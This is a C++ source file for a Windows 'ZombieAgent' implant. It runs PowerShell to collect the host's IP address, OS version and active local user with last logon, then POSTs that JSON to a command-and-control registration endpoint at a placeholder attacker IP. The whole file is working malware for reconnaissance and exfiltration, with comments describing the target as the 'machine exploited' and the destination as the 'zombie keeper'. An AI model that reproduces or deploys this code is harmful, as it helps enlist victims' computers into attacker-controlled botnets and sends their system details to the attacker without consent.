
#include <windows.h>
#include <winhttp.h>
#include <string>
#include<iostream>
#pragma comment(lib, "winhttp.lib")



/* Initial script register windows using  WINHTTP 
*  function WinHttpConnect receive ip from machine exploited
*  Compile witch:  g++ "code-name".cpp -std=c++11 -lwinhttp -o "code-name".exe
*
* 
*
*
*  Microsoft documentation -- > 
*    BOOL  bResults = FALSE;
*        HINTERNET hSession = NULL,
*               hConnect = NULL,
*                hRequest = NULL;
*
*        // Use WinHttpOpen to obtain a session handle.
*        hSession = WinHttpOpen(  L"A WinHTTP Example Program/1.0", 
*                                WINHTTP_ACCESS_TYPE_DEFAULT_PROXY,
*                                WINHTTP_NO_PROXY_NAME, 
*                                WINHTTP_NO_PROXY_BYPASS, 0);
*
*        // Specify an HTTP server.
*        if (hSession)
*            hConnect = WinHttpConnect( hSession, L"www.wingtiptoys.com",
*                                    INTERNET_DEFAULT_HTTP_PORT, 0);
*
*        // Create an HTTP Request handle.
*        if (hConnect)
*            hRequest = WinHttpOpenRequest( hConnect, L"PUT", 
*                                        L"/writetst.txt", 
*                                        NULL, WINHTTP_NO_REFERER, 
*                                        WINHTTP_DEFAULT_ACCEPT_TYPES, 
*                                        0);
*
*        // Send a Request.
*        if (hRequest) 
*            bResults = WinHttpSendRequest( hRequest, 
*                                        WINHTTP_NO_ADDITIONAL_HEADERS,
*                                        0, WINHTTP_NO_REQUEST_DATA, 0, 
*                                        0, 0);
*
*        // Place additional code here.
*
*
*        // Report errors.
*        if (!bResults)
*            printf("Error %d has occurred.\n",GetLastError());
*
*        // Close open handles.
*        if (hRequest) WinHttpCloseHandle(hRequest);
*        if (hConnect) WinHttpCloseHandle(hConnect);
*        if (hSession) WinHttpCloseHandle(hSession);
*
*
*/


std::string info_toJSON(){
    std::string command =
        "powershell -NoProfile -Command \""
        "$ip = (Get-NetIPAddress -AddressFamily IPv4 | "
        "Where-Object { $_.IPAddress -notlike '127.*' -and $_.IPAddress -notlike '169.254*' } | "
        "Select-Object -First 1 -ExpandProperty IPAddress); "

        "$osInfo = Get-ComputerInfo | "
        "Select-Object WindowsProductName, WindowsVersion; "

        "$osFull = \\\"$($osInfo.WindowsProductName) $($osInfo.WindowsVersion)\\\"; "

        "$user = Get-LocalUser | "
        "Where-Object { $_.Enabled -eq $true } | "
        "Select-Object -First 1 Name, LastLogon; "

        "$lastLogonIso = if ($user.LastLogon) { "
        "$user.LastLogon.ToString('yyyy-MM-ddTHH:mm:ss') "
        "} else { $null }; "

        "[PSCustomObject]@{ "
        "ip = $ip; "
        "os = $osFull; "
        "hostname = $user.Name; "
        "lastLogon = $lastLogonIso "
        "} | ConvertTo-Json -Compress"
        "\"";



    std::string result = "";

    char buffer [512];
    //Pipe for _popen result 
    FILE* pipe = _popen(command.c_str(), "r");;

    try{
        //Fgets for FILE stream 
        while(fgets(buffer, sizeof(buffer), pipe) != NULL){
            result += buffer;
        
        }

    }catch(...){
        _pclose(pipe);
        throw;
    }

    _pclose(pipe);
    
    return result;
}


void sendJSON(std::string& JSON ){


    //Initialize windows stack HTTP  - define user agent 
    HINTERNET hSession = WinHttpOpen(
        L"ZombieAgent/1.0",
       WINHTTP_ACCESS_TYPE_NO_PROXY,
        WINHTTP_NO_PROXY_NAME,
        WINHTTP_NO_PROXY_BYPASS,
        0
    );


    if(!hSession){
        std::cerr << "Open session falid" << std::endl;
        return;
    }

    //Set your zombie keeper ip and port  

    //Defines the destination 
    HINTERNET hConnect = WinHttpConnect(
        hSession,
        L"xxx.xxx.xxx.xxx",
        0000,
        0
    );
    
    if(!hConnect){
        std::cerr << "Connection refused" << std::endl;
        WinHttpCloseHandle(hSession);
        return;
    }

    //Create request -define path 
    HINTERNET hRequest = WinHttpOpenRequest(
        hConnect,
        L"POST",
        L"/c2-server/agents/register",
        NULL,
        WINHTTP_NO_REFERER,
        WINHTTP_DEFAULT_ACCEPT_TYPES,
        0   
    
    );
    
    if (!hRequest) {
        std::cerr << "Request failed\n";
        WinHttpCloseHandle(hConnect);
        WinHttpCloseHandle(hSession);
        return;
    }

    //Making http headers 
    std::wstring headers = L"Content-Type: application/json\r\n";
    headers += L"Content-Length: " + std::to_wstring(JSON.size()) + L"\r\n";



    // Send JSON 
    BOOL sent =  WinHttpSendRequest(
        hRequest,
        headers.c_str(),
        headers.length(),
        (LPVOID)JSON.c_str(),
        JSON.size(),
        JSON.size(),
        0

    );

    std::cout << "[*] Send JSON . . . " << std::endl;

    if(!sent){

       DWORD err = GetLastError();
       std::cerr << " [x] WinHttpSendRequest failed. Error code: " << err << std::endl;


    }else{
        WinHttpReceiveResponse(hRequest, NULL);
        std::cout << "[*] Status Ok," <<  std::endl;
    }


    WinHttpCloseHandle(hRequest);
    WinHttpCloseHandle(hConnect);
    WinHttpCloseHandle(hSession);
    
}


int main(){

    std::cout << R"(
              (
               )
              (
        /\  .-"""-.  /\
       //\\/  ,,,  \//\\
       |/\| ,;;;;;, |/\|
       //\\\;-"""-;///\\
      //  \/   .   \/  \\
     (| ,-_| \ | / |_-, |)
       //`__\.-.-./__`\\
      // /.-(() ())-.\ \\
     (\ |)   '---'   (| /)
      ` (|           |) `
        \)           (/
    )" << std::endl;


    std::string JSON = info_toJSON();

    sendJSON(JSON);

}   